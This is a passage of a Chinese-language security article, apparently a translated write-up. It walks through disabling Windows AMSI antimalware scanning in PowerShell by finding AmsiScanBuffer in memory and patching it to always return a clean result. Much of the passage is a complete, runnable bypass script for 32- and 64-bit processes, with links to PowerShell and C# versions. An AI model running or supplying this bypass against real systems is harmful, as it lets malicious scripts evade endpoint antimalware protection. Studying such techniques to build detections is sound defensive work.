@@ -1,0 +1,161 @@
+    Add-Type $Kernel32
+    Class Hunter {
+        static [IntPtr] FindAddress ([IntPtr]$address, [byte[]]$egg) {
+            while ($true) {
+                [int]$count = 0
+                while ($true) {
+                    [IntPtr]$address = [IntPtr]::Add($address, 1)
+                    If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+                        $count++
+                        If ($count -eq $egg.Length) {
+                            return [IntPtr]::Subtract($address, $egg.Length - 1)
+                        }
+                    } Else { break }
+                }
+            }
+            return $address
+        }
+    }
+    Add-Type $Kernel32
+    [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
+    Write-Host "[+] AMSI DLL Handle: $hModule"
+    [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
+    Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
+    [byte[]]$egg = [byte[]] (
+        0x4C, 0x8B, 0xDC,         # mov     r11,rsp
+        0x49, 0x89, 0x5B, 0x08,   # mov     qword ptr [r11+8],rbx
+        0x49, 0x89, 0x6B, 0x10,   # mov     qword ptr [r11+10h],rbp
+        0x49, 0x89, 0x73, 0x18,   # mov     qword ptr [r11+18h],rsi
+        0x57,                     # push    rdi
+        0x41, 0x56,               # push    r14
+        0x41, 0x57,               # push    r15
+        0x48, 0x83, 0xEC, 0x70    # sub     rsp,70h
+    )
+    [IntPtr]$targetedAddress = [Hunter]:: FindAddress($dllCanUnloadNowAddress, $egg)
+    Write-Host "[+] Targeted address $targetedAddress"
+    [string]$bytes = ""
+    [int]$i = 0
+    while ($i -lt $egg.Length) {
+        [IntPtr]$targetedAddress = [IntPtr]::Add($targetedAddress, $i)
+        $bytes += "0x" + [System.BitConverter]::ToString([System.Runtime.InteropServices.Marshal]::ReadByte($targetedAddress)) + " "
+        $i++
+    }
+    Write-Host "[+] Bytes: $bytes"
+在上述代码中，`Hunter`类的`FindAddress`静态方法会通过传参地址来递增搜索VAS中的地址，也就是`DllCanUnloadNow`函数的地址。然后，该方法使用`Marshal`类的`ReadByte`静态方法来获取该地址对应的字节，将其与我们查找的字节序列进行匹配。最后，如果找到匹配序列，代码就会返回函数对应的地址。
+如上图所示，我们找到的字节刚好是`AmsiScanbuffer`函数的前24个字节，因此，我们可以使用这种技术成功动态发现`AmsiScanBuffer`。
+## 0x05 Patch
+发现函数地址后，下一步就是修改函数指令，避免该函数检测到“恶意”内容。
+根据微软官方文档，`AmsiScanBuffer`函数应该返回[`HRESULT`](https://docs.microsoft.com/en-us/windows/desktop/seccrypto/common-hresult-values)类型值，这是一个整数值，用来表示操作是否成功。在我们的例子中，如果该函数成功，那么就应当返回`S_OK`（`0x00000000`），否则应该返回`HRESULT`错误代码。
+这个函数的主要功能是返回需要扫描的内容是否存在问题，这也是`result`变量会作为参数传递给`AmsiScanBuffer`函数的原因所在。这个变量的类型为`AMSI_RESULT`枚举类型。
+对应的枚举原型如下所示：
+    typedef enum AMSI_RESULT {
+        AMSI_RESULT_CLEAN,
+        AMSI_RESULT_NOT_DETECTED,
+        AMSI_RESULT_BLOCKED_BY_ADMIN_START,
+        AMSI_RESULT_BLOCKED_BY_ADMIN_END,
+        AMSI_RESULT_DETECTED
+    };
+在函数执行过程中，待分析的内容会被发送到反恶意软件服务，后者会返回`1`到`32762`（含）之间的一个整数。整数值越大，则代表风险越高。如果证书大于或等于`32762`，那么就会将其判断为恶意数据，加以阻止。随后系统会根据返回的整数值来更新`AMSI_RESULT`变量值。
+默认情况下，该变量处于“正常”（“无害”）值状态，因此，如果我们修改了函数指令，使其永远不会将待分析的内容发送给反恶意软件服务，并且返回`S_OK`
+`HRESULT`结果值，那么这些内容就会被当成无害数据。
+在汇编语言中，`EAX`（32位）以及`RAX`（64位）寄存器始终包含函数的返回值。因此，如果`EAX`/`RAX`寄存器值等于0，并且如果执行了`ret`汇编指令，那么该函数就会返回`S_OK`
+`HRSULT`，不会将待分析数据发送给反恶意软件服务。
+为了完成该任务，我们可以使用如下汇编代码：
+    xor    EAX, EAX
+    ret
+为了patch `AmsiScanBuffer`函数，我们需要将前几个字节修改为`0x31 0xC0
+0xC3`（如上汇编指令的十六进制表示）。然而，在执行修改操作之前，待修改的区域必须为可读/可写。否则，任何读取或写入操作都会导致访问冲突异常。为了修改目标内存区域的保护机制，我们可以使用`Kernel32`
+DLL中的`VirtualProtect`函数。这个导出函数可以修改指定区域的内存保护机制。
+如下PowerShell代码片段使用了`VirtualProtect`函数来修改`AmsiScanBuffer`函数的前3字节内存保护。
+    # PAGE_READWRITE = 0x04
+    $oldProtectionBuffer = 0
+    [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+然后，`Marshal`类的`Copy`静态方法可以用来将指定字节拷贝（覆盖）到指定地址。在这里，我们使用这个静态方法来patch内存。
+    $patch = [Byte[]] (0x31, 0xC0, 0xC3) # xor eax, eax; ret
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+最后，我们再次使用`VirtualProtect`函数来重新初始化原始的内存保护状态。
+    $a = 0
+    [Kernel32]::VirtualProtect($targetedAddress, [uint32]5, $oldProtectionBuffer, [ref]$a) |  Out-Null
+将这些步骤结合起来后，我们就可以得到完整版的PowerShell脚本，完成如下操作：
+  * 获取AMSI DLL的句柄
+  * 获取`DllCanUnloadNow`函数的地址
+  * 通过egg hunter技术查找`AmsiScanBuffer`函数的地址
+  * 修改内存区域为可读写状态
+  * patch
+  * 重新初始化被修改的内存区域，恢复原始保护状态
+完整代码如下：
+    Write-Host "-- AMSI Patch"
+    Write-Host "-- Paul Laîné (@am0nsec)"
+    Write-Host ""
+    $Kernel32 = @"
+    using System;
+    using System.Runtime.InteropServices;
+    public class Kernel32 {
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string lpLibFileName);
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    }
+    "@
+    Add-Type $Kernel32
+    Class Hunter {
+        static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
+            while ($true) {
+                [int]$count = 0
+                while ($true) {
+                    [IntPtr]$address = [IntPtr]::Add($address, 1)
+                    If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
+                        $count++
+                        If ($count -eq $egg.Length) {
+                            return [IntPtr]::Subtract($address, $egg.Length - 1)
+                        }
+                    } Else { break }
+                }
+            }
+            return $address
+        }
+    }
+    [IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
+    Write-Host "[+] AMSI DLL Handle: $hModule"
+    [IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
+    Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"
+    If ([IntPtr]::Size -eq 8) {
+        Write-Host "[+] 64-bits process"
+        [byte[]]$egg = [byte[]] (
+            0x4C, 0x8B, 0xDC,       # mov     r11,rsp
+            0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
+            0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
+            0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
+            0x57,                   # push    rdi
+            0x41, 0x56,             # push    r14
+            0x41, 0x57,             # push    r15
+            0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
+        )
+    } Else {
+        Write-Host "[+] 32-bits process"
+        [byte[]]$egg = [byte[]] (
+            0x8B, 0xFF,             # mov     edi,edi
+            0x55,                   # push    ebp
+            0x8B, 0xEC,             # mov     ebp,esp
+            0x83, 0xEC, 0x18,       # sub     esp,18h
+            0x53,                   # push    ebx
+            0x56                    # push    esi
+        )
+    }
+    [IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
+    Write-Host "[+] Targeted address: $targetedAddress"
+    $oldProtectionBuffer = 0
+    [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null
+    $patch = [byte[]] (
+        0x31, 0xC0,    # xor rax, rax
+        0xC3           # ret  
+    )
+    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)
+    $a = 0
+    [Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null
+如上图所示，我们成功绕过了AMSI。
+## 0x06 总结
+我们在如下Windows版本中对这种技术进行了测试：
+完整版的PowerShell脚本可从[Github](https://gist.github.com/amonsec/986db36000d82b39c73218facc557628)上下载，C#版实现请参考[此处](https://gist.github.com/amonsec/854a6662f9df165789c8ed2b556e9597)。
